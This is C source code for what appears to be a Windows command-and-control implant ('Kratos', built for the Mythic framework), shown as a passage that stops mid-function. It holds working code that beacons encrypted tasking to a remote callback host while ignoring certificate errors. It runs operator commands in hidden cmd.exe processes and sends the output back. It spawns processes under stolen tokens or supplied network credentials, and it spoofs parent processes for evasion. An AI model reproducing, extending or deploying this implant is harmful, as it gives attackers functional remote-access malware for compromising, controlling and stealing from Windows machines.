#define _WIN32_WINNT 0x0600
#include "utils.h"
#include "config.h"
#include "crypto.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>

/* Current AES key (32 bytes). Initialized once from KRATOS_AESPSK. */
static unsigned char g_aes_key[32];
static int g_has_aes_key = -1; /* -1=not init, 0=plaintext, 1=key ready */

/* Primary token stolen via steal_token. NULL = no active impersonation.
 * Used by execute_shell to spawn commands under this token. */
HANDLE g_stolen_token = NULL;
int g_netonly_active = 0;
char g_netonly_username[256] = {0};
char g_netonly_domain[256] = {0};
char g_netonly_password[512] = {0};

extern char current_uuid[128];

#ifndef CALLBACK_HOST
#define CALLBACK_HOST "127.0.0.1"
#endif

#ifndef CALLBACK_PORT
#define CALLBACK_PORT 80
#endif

#ifndef SLEEP_TIME
#define SLEEP_TIME 5
#endif

#ifndef USER_AGENT
#define USER_AGENT                                                             \
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like " \
  "Gecko) Chrome/58.0.3029.110 Safari/537.36"
#endif

#ifndef POST_URI
#define POST_URI "/api/v1"
#endif


/* Initialise la cl\u00e9 AES depuis la constante compil\u00e9e KRATOS_AESPSK.
 * Plac\u00e9e ici pour pouvoir utiliser DEBUG_PRINT. */
static void ensure_crypto_init(void) {
  if (g_has_aes_key != -1)
    return;
  g_has_aes_key = crypto_init_key(KRATOS_AESPSK, g_aes_key);
  DEBUG_PRINT("Crypto init: %s",
              g_has_aes_key ? "AES-256-CBC active" : "plaintext mode");
}

// Base64 logic
static const char base64_table[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static int b64_inv[256];
static int b64_inv_init = 0;

char *base64_encode(const unsigned char *src, size_t len) {
  unsigned char *out, *pos;
  const unsigned char *end, *in;
  size_t olen;

  olen = len * 4 / 3 + 4;
  olen += olen / 72;
  olen++;
  out = (char *)malloc(olen);
  if (out == NULL)
    return NULL;

  end = src + len;
  in = src;
  pos = (unsigned char *)out;
  while (end - in >= 3) {
    *pos++ = base64_table[in[0] >> 2];
    *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
    *pos++ = base64_table[((in[1] & 0x0f) << 2) | (in[2] >> 6)];
    *pos++ = base64_table[in[2] & 0x3f];
    in += 3;
  }

  if (end - in) {
    *pos++ = base64_table[in[0] >> 2];
    if (end - in == 1) {
      *pos++ = base64_table[(in[0] & 0x03) << 4];
      *pos++ = '=';
      *pos++ = '=';
    } else {
      *pos++ = base64_table[((in[0] & 0x03) << 4) | (in[1] >> 4)];
      *pos++ = base64_table[(in[1] & 0x0f) << 2];
      *pos++ = '=';
    }
  }

  *pos = '\0';
  return out;
}

void init_b64_inv() {
  if (b64_inv_init)
    return;
  for (int i = 0; i < 256; i++)
    b64_inv[i] = -1;
  for (int i = 0; i < 64; i++)
    b64_inv[(unsigned char)base64_table[i]] = i;
  b64_inv_init = 1;
}

char *base64_decode(const char *src, size_t len) {
  init_b64_inv();
  char *out = (char *)malloc(len);
  int i = 0, j = 0;
  int v = 0;
  int bits = 0;
  for (i = 0; i < len; i++) {
    if (src[i] == '\0')
      break;
    int val = b64_inv[(unsigned char)src[i]];
    if (val == -1)
      continue;
    v = (v << 6) | val;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out[j++] = (v >> bits) & 0xFF;
    }
  }
  out[j] = '\0';
  return out;
}

unsigned char *base64_decode_bin(const char *src, size_t len, size_t *out_len) {
  init_b64_inv();
  unsigned char *out = (unsigned char *)malloc(len);
  int i = 0, j = 0;
  int v = 0;
  int bits = 0;
  for (i = 0; i < len; i++) {
    if (src[i] == '\0')
      break;
    int val = b64_inv[(unsigned char)src[i]];
    if (val == -1)
      continue;
    v = (v << 6) | val;
    bits += 6;
    if (bits >= 8) {
      bits -= 8;
      out[j++] = (v >> bits) & 0xFF;
    }
  }
  if (out_len)
    *out_len = j;
  return out;
}

void log_error(const char *msg) {
#if DEBUG
  DWORD err = GetLastError();
  DEBUG_PRINT("%s. Error Code: %lu", msg, err);
#endif
}

char *send_c2_message(const char *json_msg) {
  HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
  char *response_buffer = NULL;

  DEBUG_PRINT("Sending C2 message: %s", json_msg);

  // Parse Host
  char host[256];
  strncpy(host, CALLBACK_HOST, sizeof(host) - 1);
  host[255] = '\0';

  int is_https = 0;
  char *actual_host = host;

  if (strncmp(host, "https://", 8) == 0) {
    is_https = 1;
    actual_host += 8;
  } else if (strncmp(host, "http://", 7) == 0) {
    actual_host += 7;
  }

  // Strip trailing slash or path if accidentally included
  char *slash = strchr(actual_host, '/');
  if (slash)
    *slash = '\0';

  // Strip port if accidentally included in the host string
  char *colon = strchr(actual_host, ':');
  if (colon)
    *colon = '\0';

  // Use Unicode for WinHTTP
  wchar_t wUserAgent[512];
  mbstowcs(wUserAgent, USER_AGENT, 512);

  hSession = WinHttpOpen(wUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                         WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) {
    log_error("WinHttpOpen failed");
    return NULL;
  }

  wchar_t wHost[256];
  mbstowcs(wHost, actual_host, 256);

  hConnect = WinHttpConnect(hSession, wHost, CALLBACK_PORT, 0);
  if (!hConnect) {
    log_error("WinHttpConnect failed");
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  char safe_uri[256];
  if (POST_URI[0] != '/') {
    snprintf(safe_uri, sizeof(safe_uri), "/%s", POST_URI);
  } else {
    strncpy(safe_uri, POST_URI, sizeof(safe_uri) - 1);
  }
  safe_uri[255] = '\0';

  // Si l'utilisateur avait mis "///data" par erreur, on nettoie
  char *dslash;
  while ((dslash = strstr(safe_uri, "//")) != NULL) {
    memmove(dslash, dslash + 1, strlen(dslash));
  }

  wchar_t wObject[256];
  mbstowcs(wObject, safe_uri, 256);

  DWORD dwFlags = 0;
  if (is_https) {
    dwFlags |= WINHTTP_FLAG_SECURE;
  }

  hRequest =
      WinHttpOpenRequest(hConnect, L"POST", wObject, NULL, WINHTTP_NO_REFERER,
                         WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);
  if (!hRequest) {
    log_error("WinHttpOpenRequest failed");
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  /* For HTTPS (self-signed / lab), ignore certificate errors */
  if (is_https) {
    DWORD dwOpt = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_UNKNOWN_CA;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwOpt,
                     sizeof(dwOpt));
  }

  /* -- Add Content-Type to avoid 12002 timeouts on Tunnelmole --
   */
  const wchar_t *pszHeaders = L"Content-Type: text/plain\r\n";
  WinHttpAddRequestHeaders(hRequest, pszHeaders, -1L,
                           WINHTTP_ADDREQ_FLAG_ADD |
                               WINHTTP_ADDREQ_FLAG_REPLACE);

#ifdef KRATOS_HEADERS
  if (strlen(KRATOS_HEADERS) > 0) {
    wchar_t wHeaders[4096];
    memset(wHeaders, 0, sizeof(wHeaders));
    size_t converted = mbstowcs(wHeaders, KRATOS_HEADERS, 4095);
    if (converted > 0) {
      WinHttpAddRequestHeaders(hRequest, wHeaders, -1L,
                               WINHTTP_ADDREQ_FLAG_ADD);
    }
  }
#endif

  /* -- Build the message: UUID + payload (encrypted or not) -- */
  ensure_crypto_init();

  size_t json_len = strlen(json_msg);
  char *b64_msg = NULL;

  if (g_has_aes_key) {
    /* Encrypted mode: AES-256-CBC + HMAC-SHA256 */
    size_t cipher_len = 0;
    unsigned char *cipherblob = aes256_encrypt(
        g_aes_key, (const unsigned char *)json_msg, json_len, &cipher_len);
    if (cipherblob) {
      /* Prefix UUID (36 chars) to the cipherblob */
      size_t total_len = 36 + cipher_len;
      unsigned char *data_with_uuid = (unsigned char *)malloc(total_len);
      if (data_with_uuid) {
        memcpy(data_with_uuid, current_uuid, 36);
        memcpy(data_with_uuid + 36, cipherblob, cipher_len);
        b64_msg = base64_encode(data_with_uuid, total_len);
        free(data_with_uuid);
      }
      free(cipherblob);
    }
  } else {
    /* Mode plaintext (AESPSK = none) */
    size_t total_len = 36 + json_len;
    char *data_with_uuid = (char *)malloc(total_len + 1);
    if (data_with_uuid) {
      memcpy(data_with_uuid, current_uuid, 36);
      memcpy(data_with_uuid + 36, json_msg, json_len);
      data_with_uuid[total_len] = '\0';
      b64_msg = base64_encode((const unsigned char *)data_with_uuid, total_len);
      free(data_with_uuid);
    }
  }

  if (!b64_msg) {
    log_error("Failed to encode message");
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return NULL;
  }

  DEBUG_PRINT("Sent B64 Msg (len: %lu): %.100s...",
              (unsigned long)strlen(b64_msg), b64_msg);

  /* For bodies > 64 KB, WinHTTP recommends WinHttpWriteData rather than
   * lpOptional in WinHttpSendRequest. Beyond this limit, lpOptional
   * may be truncated/corrupted -> server receives an invalid request and
   * retourne 404. On utilise donc toujours WinHttpWriteData. */
  size_t body_len = strlen(b64_msg);
  BOOL bResults =
      WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                         WINHTTP_NO_REQUEST_DATA, 0, (DWORD)body_len, 0);

  if (bResults) {
    DWORD written = 0;
    bResults = WinHttpWriteData(hRequest, b64_msg, (DWORD)body_len, &written);
  }

  if (!bResults) {
    log_error("WinHttpSendRequest/WriteData failed");
  } else {
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
      log_error("WinHttpReceiveResponse failed");
    } else {
      DWORD dwStatusCode = 0;
      DWORD dwSize = sizeof(dwStatusCode);
      if (WinHttpQueryHeaders(
              hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
              WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize,
              WINHTTP_NO_HEADER_INDEX)) {
        DEBUG_PRINT("HTTP Status Code: %lu", dwStatusCode);
      }
    }
  }

  if (bResults) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;

    do {
      dwSize = 0;
      if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
        log_error("WinHttpQueryDataAvailable failed");
        break;
      }
      DEBUG_PRINT("Data Available: %lu bytes", dwSize);

      if (dwSize == 0)
        break;

      char *file_buffer = (char *)malloc(dwSize + 1);
      if (!file_buffer)
        break;

      ZeroMemory(file_buffer, dwSize + 1);

      if (WinHttpReadData(hRequest, (LPVOID)file_buffer, dwSize,
                          &dwDownloaded)) {
        DEBUG_PRINT("Read Data: %lu bytes", dwDownloaded);
        if (response_buffer == NULL) {
          response_buffer = file_buffer;
        } else {
          size_t old_len = strlen(response_buffer);
          response_buffer =
              (char *)realloc(response_buffer, old_len + dwDownloaded + 1);
          memcpy(response_buffer + old_len, file_buffer, dwDownloaded);
          response_buffer[old_len + dwDownloaded] = 0;
          free(file_buffer);
        }
      } else {
        log_error("WinHttpReadData failed");
        free(file_buffer);
      }
    } while (dwSize > 0);
  }

  free(b64_msg);
  if (hRequest)
    WinHttpCloseHandle(hRequest);
  if (hConnect)
    WinHttpCloseHandle(hConnect);
  if (hSession)
    WinHttpCloseHandle(hSession);

  if (response_buffer) {
    DEBUG_PRINT("Received response (len: %lu)",
                (unsigned long)strlen(response_buffer));
  } else {
    DEBUG_PRINT("No response received");
  }

  return response_buffer;
}

/* ---- Shared pipe output reader (Xenon-style polling) ------------- */
/* ReadFile blocking waits for ALL write ends to close, which deadlocks
 * when the child process spawns sub-processes that inherit the write end.
 * PeekNamedPipe polls without blocking, draining as data arrives. */
static char *read_pipe_output(HANDLE hRead, HANDLE hProcess) {
  char *output = (char *)malloc(1);
  output[0] = '\0';
  size_t total = 0;
  char buf[4096];
  DWORD n, avail;

  while (1) {
    /* Drain all currently available data */
    while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
      if (!ReadFile(hRead, buf, sizeof(buf) - 1, &n, NULL) || n == 0) goto done;
      output = (char *)realloc(output, total + n + 1);
      memcpy(output + total, buf, n);
      total += n;
      output[total] = '\0';
    }
    /* Stop when process has exited AND pipe is drained */
    if (WaitForSingleObject(hProcess, 0) == WAIT_OBJECT_0) {
      /* One final drain after process exit */
      while (PeekNamedPipe(hRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
        if (!ReadFile(hRead, buf, sizeof(buf) - 1, &n, NULL) || n == 0) break;
        output = (char *)realloc(output, total + n + 1);
        memcpy(output + total, buf, n);
        total += n;
        output[total] = '\0';
      }
      break;
    }
    Sleep(10);
  }
done:
  return output;
}

/* ---- PPID spoofing helpers --------------------------------------- */
static DWORD find_spoof_parent_pid(void) {
  HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (snap == INVALID_HANDLE_VALUE) return 0;
  PROCESSENTRY32 pe;
  pe.dwSize = sizeof(pe);
  DWORD pid = 0;
  if (Process32First(snap, &pe)) {
    do {
      if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
        pid = pe.th32ProcessID;
        break;
      }
    } while (Process32Next(snap, &pe));
  }
  CloseHandle(snap);
  return pid;
}

/* ---- Spawn helper: pipes + optional PPID spoof ------------------- */
/* When PPID spoof is active, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS alone
 * makes the child inherit handles from explorer, not from us. We MUST
 * also set PROC_THREAD_ATTRIBUTE_HANDLE_LIST to explicitly pass our
 * pipe handles. Both attributes require attr count = 2. */
static char *spawn_with_pipes(const char *app, char *cmdline, BOOL spoof_parent) {
  SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
  HANDLE hRead, hWrite;
  if (!CreatePipe(&hRead, &hWrite, &sa, 0))
    return strdup("Error: CreatePipe failed");
  SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

  HANDLE hNullIn = CreateFileA("nul", GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE,
                               &sa, OPEN_EXISTING, 0, NULL);

  HANDLE hParent = NULL;
  LPPROC_THREAD_ATTRIBUTE_LIST attrs = NULL;
  DWORD create_flags = CREATE_NO_WINDOW;

  STARTUPINFOEXA siex;
  ZeroMemory(&siex, sizeof(siex));
  siex.StartupInfo.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  siex.StartupInfo.wShowWindow = SW_HIDE;
  siex.StartupInfo.hStdOutput  = hWrite;
  siex.StartupInfo.hStdError   = hWrite;
  siex.StartupInfo.hStdInput   = (hNullIn != INVALID_HANDLE_VALUE) ? hNullIn : NULL;

  if (spoof_parent) {
    DWORD spoof_pid = find_spoof_parent_pid();
    if (spoof_pid) {
      hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid);
      if (hParent) {
        SIZE_T attr_size = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
        attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
        if (attrs && InitializeProcThreadAttributeList(attrs, 1, 0, &attr_size)) {
          if (UpdateProcThreadAttribute(attrs, 0,
                  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                  &hParent, sizeof(HANDLE), NULL, NULL)) {
            siex.lpAttributeList = attrs;
            create_flags |= EXTENDED_STARTUPINFO_PRESENT;
          } else {
            DeleteProcThreadAttributeList(attrs);
            HeapFree(GetProcessHeap(), 0, attrs);
            attrs = NULL;
          }
        } else if (attrs) {
          HeapFree(GetProcessHeap(), 0, attrs);
          attrs = NULL;
        }
      }
    }
  }

  siex.StartupInfo.cb = (create_flags & EXTENDED_STARTUPINFO_PRESENT)
                        ? sizeof(STARTUPINFOEXA)
                        : sizeof(STARTUPINFOA);

  PROCESS_INFORMATION pi;
  ZeroMemory(&pi, sizeof(pi));
  BOOL ok = CreateProcessA(app, cmdline, NULL, NULL, TRUE,
                           create_flags, NULL, NULL,
                           (LPSTARTUPINFOA)&siex, &pi);
  DWORD err = GetLastError();
  CloseHandle(hWrite);
  if (hNullIn != INVALID_HANDLE_VALUE) CloseHandle(hNullIn);

  if (attrs) { DeleteProcThreadAttributeList(attrs); HeapFree(GetProcessHeap(), 0, attrs); }
  if (hParent) CloseHandle(hParent);

  if (!ok) {
    CloseHandle(hRead);
    char *msg = (char *)malloc(96);
    snprintf(msg, 96, "Error: CreateProcess failed (%lu)", err);
    return msg;
  }

  char *output = read_pipe_output(hRead, pi.hProcess);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  CloseHandle(hRead);
  return output;
}

static char *execute_shell_with_token(HANDLE hToken, const char *cmd) {
  /* Chemin du fichier temporaire dans %SystemRoot%\Temp\ */
  char sys_root[MAX_PATH] = "C:\\Windows";
  GetEnvironmentVariableA("SystemRoot", sys_root, sizeof(sys_root));
  char tmp_file[MAX_PATH];
  snprintf(tmp_file, sizeof(tmp_file), "%s\\Temp\\krt%lu.tmp", sys_root,
           GetCurrentProcessId() ^ GetCurrentThreadId());

  /* Chemin complet vers cmd.exe */
  char cmd_path[MAX_PATH];
  GetSystemDirectoryA(cmd_path, sizeof(cmd_path));
  strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);

  /* Commande : cmd.exe /c <cmd> > tmp_file 2>&1 */
  char full[2048];
  snprintf(full, sizeof(full), "%s /c %s > \"%s\" 2>&1", cmd_path, cmd,
           tmp_file);
  wchar_t wcmd[2048];
  wchar_t wapp[MAX_PATH];
  MultiByteToWideChar(CP_ACP, 0, full, -1, wcmd, 2048);
  MultiByteToWideChar(CP_ACP, 0, cmd_path, -1, wapp, MAX_PATH);

  STARTUPINFOW si;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.lpDesktop = L"winsta0\\default"; // Crucial pour SecLogon

  PROCESS_INFORMATION pi;
  ZeroMemory(&pi, sizeof(pi));

  /* Tenter CreateProcessWithTokenW */
  DWORD sess = 0;
  ProcessIdToSessionId(GetCurrentProcessId(), &sess);
  SetTokenInformation(hToken, TokenSessionId, &sess, sizeof(sess));

  BOOL ok = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, wapp, wcmd,
                                    CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
  DWORD lastErr = GetLastError();

  if (!ok) {
    DeleteFileA(tmp_file);
    char *err = (char *)malloc(128);
    snprintf(err, 128,
             "Error: CreateProcessWithTokenW failed (%lu). Check if Secondary "
             "Logon service is running.",
             lastErr);
    return err;
  }

  WaitForSingleObject(pi.hProcess, 30000);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  /* Lire le fichier de sortie */
  HANDLE hFile =
      CreateFileA(tmp_file, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  char *output = (char *)malloc(1);
  output[0] = '\0';
  size_t total = 0;

  if (hFile != INVALID_HANDLE_VALUE) {
    char buf[4096];
    DWORD bytes_read;
    while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytes_read, NULL) &&
           bytes_read > 0) {
      output = (char *)realloc(output, total + bytes_read + 1);
      memcpy(output + total, buf, bytes_read);
      total += bytes_read;
      output[total] = '\0';
    }
    CloseHandle(hFile);
  }
  DeleteFileA(tmp_file);
  return output;
}

static char *execute_shell_netonly(const char *cmd) {
  char sys_root[MAX_PATH] = "C:\\Windows";
  GetEnvironmentVariableA("SystemRoot", sys_root, sizeof(sys_root));
  char tmp_file[MAX_PATH];
  snprintf(tmp_file, sizeof(tmp_file), "%s\\Temp\\krt%lu.tmp", sys_root,
           GetCurrentProcessId() ^ GetCurrentThreadId());

  char cmd_path[MAX_PATH];
  GetSystemDirectoryA(cmd_path, sizeof(cmd_path));
  strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);

  char full[2048];
  snprintf(full, sizeof(full), "%s /c %s > \"%s\" 2>&1", cmd_path, cmd,
           tmp_file);

  wchar_t wuser[256];
  wchar_t wdomain[256];
  wchar_t wpass[512];
  wchar_t wcmd[2048];
  MultiByteToWideChar(CP_ACP, 0, g_netonly_username, -1, wuser, 256);
  MultiByteToWideChar(CP_ACP, 0, g_netonly_domain, -1, wdomain, 256);
  MultiByteToWideChar(CP_ACP, 0, g_netonly_password, -1, wpass, 512);
  MultiByteToWideChar(CP_ACP, 0, full, -1, wcmd, 2048);

  STARTUPINFOW si;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  PROCESS_INFORMATION pi;
  ZeroMemory(&pi, sizeof(pi));

  BOOL ok = CreateProcessWithLogonW(
      wuser, wdomain, wpass, LOGON_NETCREDENTIALS_ONLY, NULL, wcmd,
      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
  DWORD lastErr = GetLastError();

  if (!ok) {
    DeleteFileA(tmp_file);
    char *err = (char *)malloc(160);
    snprintf(err, 160,
             "Error: CreateProcessWithLogonW(LOGON_NETCREDENTIALS_ONLY) "
             "failed (%lu)",
             lastErr);
    return err;
  }

  WaitForSingleObject(pi.hProcess, 30000);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  HANDLE hFile =
      CreateFileA(tmp_file, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                  NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  char *output = (char *)malloc(1);
  output[0] = '\0';
  size_t total = 0;

  if (hFile != INVALID_HANDLE_VALUE) {
    char buf[4096];
    DWORD bytes_read;
    while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytes_read, NULL) &&
           bytes_read > 0) {
      output = (char *)realloc(output, total + bytes_read + 1);
      memcpy(output + total, buf, bytes_read);
      total += bytes_read;
      output[total] = '\0';
    }
    CloseHandle(hFile);
  }
  DeleteFileA(tmp_file);
  return output;
}

char *execute_shell(const char *cmd) {
  if (g_netonly_active) {
    return execute_shell_netonly(cmd);
  }

  /* If a stolen token is active, attempt to spawn via SecLogon */
  if (g_stolen_token != NULL) {
    return execute_shell_with_token(g_stolen_token, cmd);
  }

  /* Chemin de cmd.exe */
  char cmd_path[MAX_PATH];
  GetSystemDirectoryA(cmd_path, sizeof(cmd_path));
  strncat(cmd_path, "\\cmd.exe", sizeof(cmd_path) - strlen(cmd_path) - 1);

  /* Fichier temporaire pour capturer stdout+stderr */
  char sys_root[MAX_PATH] = "C:\\Windows";
  GetEnvironmentVariableA("SystemRoot", sys_root, sizeof(sys_root));
  char tmp_file[MAX_PATH];
  snprintf(tmp_file, sizeof(tmp_file), "%s\\Temp\\krt%lu.tmp", sys_root,
           GetCurrentProcessId() ^ GetCurrentThreadId());

  char full[2048];
  snprintf(full, sizeof(full), "%s /c %s > \"%s\" 2>&1", cmd_path, cmd, tmp_file);

  STARTUPINFOA si;
  ZeroMemory(&si, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;

  PROCESS_INFORMATION pi;
  ZeroMemory(&pi, sizeof(pi));

  if (!CreateProcessA(NULL, full, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    DeleteFileA(tmp_file);
    return strdup("Error: CreateProcess failed");
  }

  WaitForSingleObject(pi.hProcess, 30000);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);

  /* Lire le fichier de sortie */
  HANDLE hFile = CreateFileA(tmp_file, GENERIC_READ,
                              FILE_SHARE_READ | FILE_SHARE_WRITE,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  char *output = (char *)malloc(1);
  output[0] = '\0';
  size_t total_len = 0;

  if (hFile != INVALID_HANDLE_VALUE) {
    char buf[4096];
    DWORD bytes_read;
    while (ReadFile(hFile, buf, sizeof(buf) - 1, &bytes_read, NULL) &&
           bytes_read > 0) {
      output = (char *)realloc(output, total_len + bytes_read + 1);
      memcpy(output + total_len, buf, bytes_read);
      total_len += bytes_read;
      output[total_len] = '\0';
    }
    CloseHandle(hFile);
  }
  DeleteFileA(tmp_file);
  return output;
}

/* run: spawn the executable directly, no cmd.exe, pipes + PPID spoof */
char *execute_process(const char *executable, const char *arguments) {
  if (g_netonly_active || g_stolen_token) {
    /* Fallback for impersonation contexts */
    char full[2048];
    if (arguments && arguments[0])
      snprintf(full, sizeof(full), "%s %s", executable, arguments);
    else
      strncpy(full, executable, sizeof(full) - 1);
    return execute_shell(full);
  }

  char exe_path[MAX_PATH] = {0};
  if (!SearchPathA(NULL, executable, ".exe", sizeof(exe_path), exe_path, NULL))
    strncpy(exe_path, executable, sizeof(exe_path) - 1);

  char cmdline[2048];
  if (arguments && arguments[0])
    snprintf(cmdline, sizeof(cmdline), "\"%s\" %s", exe_path, arguments);
  else
    snprintf(cmdline, sizeof(cmdline), "\"%s\"", exe_path);

  /* PPID spoof incompatible with pipe handle inheritance: child would
   * inherit handles from the spoofed parent (explorer), not from us. */
  return spawn_with_pipes(exe_path, cmdline, FALSE);
}

char *ConsoleOutputToUTF8(const char *input) {
  if (!input)
    return strdup("");

  int wlen = MultiByteToWideChar(CP_OEMCP, 0, input, -1, NULL, 0);
  if (wlen == 0)
    return strdup(input);

  wchar_t *wstr = (wchar_t *)malloc(wlen * sizeof(wchar_t));
  if (!wstr)
    return strdup(input);

  MultiByteToWideChar(CP_OEMCP, 0, input, -1, wstr, wlen);

  int ulen = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
  if (ulen == 0) {
    free(wstr);
    return strdup(input);
  }

  char *utf8 = (char *)malloc(ulen);
  if (!utf8) {
    free(wstr);
    return strdup(input);
  }

  WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8, ulen, NULL, NULL);
  free(wstr);

  return utf8;
}

void extract_json_string(const char *json, const char *key, char *buffer,
                         size_t buffer_size) {
  char key_pattern[64];
  snprintf(key_pattern, sizeof(key_pattern), "\"%s\"", key);

  char *key_ptr = strstr(json, key_pattern);
  if (!key_ptr)
    return;

  char *val_start = strchr(key_ptr, ':');
  if (!val_start)
    return;

  val_start = strchr(val_start, '"');
  if (!val_start)
    return;
  val_start++;

  size_t i = 0;
  const char *p = val_start;
  while (*p && i < buffer_size - 1) {
    if (*p == '"')
      break;

    if (*p == '\\') {
      p++;
      if (!*p)
        break;
      if (*p == 'n')
        buffer[i++] = '\n';
      else if (*p == 'r')
        buffer[i++] = '\r';
      else if (*p == 't')
        buffer[i++] = '\t';
      else if (*p == '"')
        buffer[i++] = '"';
      else if (*p == '\\')
        buffer[i++] = '\\';
      else
        buffer[i++] = *p;
    } else {
      buffer[i++] = *p;
    }
    p++;
  }
  buffer[i] = 0;
}

char *json_escape(const char *str) {
  if (!str)
    return strdup("");

  size_t len = strlen(str);
  size_t new_len = len * 2 + 1;
  char *escaped = (char *)malloc(new_len);
  if (!escaped)
    return strdup("");

  size_t j = 0;
  for (size_t i = 0; i < len; i++) {
    unsigned char c = (unsigned char)str[i];
    if (c == '"') {
      escaped[j++] = '\\';
      escaped[j++] = '"';
    } else if (c == '\\') {
      escaped[j++] = '\\';
      escaped[j++] = '\\';
    } else if (c == '\n') {
      escaped[j++] = '\\';
      escaped[j++] = 'n';
    } else if (c == '\r') {
    } else if (c == '\t') {
      escaped[j++] = '\\';
      escaped[j++] = 't';
    } else if (c < 32) {
      escaped[j++] = '.';
    } else {
      escaped[j++] = c;
    }
  }
  escaped[j] = 0;
  return escaped;
}

void send_task_response(const char *task_id, const char *raw_output) {
  char *utf8_output = ConsoleOutputToUTF8(raw_output);
  char *escaped_output = json_escape(utf8_output ? utf8_output : "");

  size_t resp_len = strlen(escaped_output) + 512 + strlen(task_id);
  char *resp_msg = (char *)malloc(resp_len);

  if (resp_msg) {
    snprintf(resp_msg, resp_len,
             "{\"action\": \"post_response\", \"responses\": "
             "[{\"task_id\": \"%s\", \"user_output\": \"%s\", "
             "\"status\": \"success\", \"completed\": true}]}",
             task_id, escaped_output);

    char *resp = send_c2_message(resp_msg);
    if (resp)
      free(resp); // Fix leak
    free(resp_msg);
  }

  free(escaped_output);
  free(utf8_output);
}

char *process_mythic_response(const char *b64_resp, size_t b64_len) {
  if (!b64_resp || b64_len == 0)
    return NULL;

  size_t decoded_len = 0;
  unsigned char *full_decoded =
      base64_decode_bin(b64_resp, b64_len, &decoded_len);
  if (!full_decoded)
    return NULL;

  char *json_out = NULL;

  ensure_crypto_init();

  if (decoded_len > 36) {
    const unsigned char *payload = full_decoded + 36;
    size_t payload_len = decoded_len - 36;

    if (g_has_aes_key) {
      /* Encrypted mode: verify HMAC then decrypt */
      size_t plain_len = 0;
      unsigned char *plain =
          aes256_decrypt(g_aes_key, payload, payload_len, &plain_len);
      if (plain) {
        json_out = (char *)plain; /* already null-terminated by aes256_decrypt */
      } else {
        DEBUG_PRINT("aes256_decrypt failed (HMAC mismatch or bad padding)");
      }
    } else {
      /* Mode plaintext */
      json_out = (char *)malloc(payload_len + 1);
      if (json_out) {
        memcpy(json_out, payload, payload_len);
        json_out[payload_len] = '\0';
      }
    }
  } else if (decoded_len > 0 && full_decoded[0] == '{') {
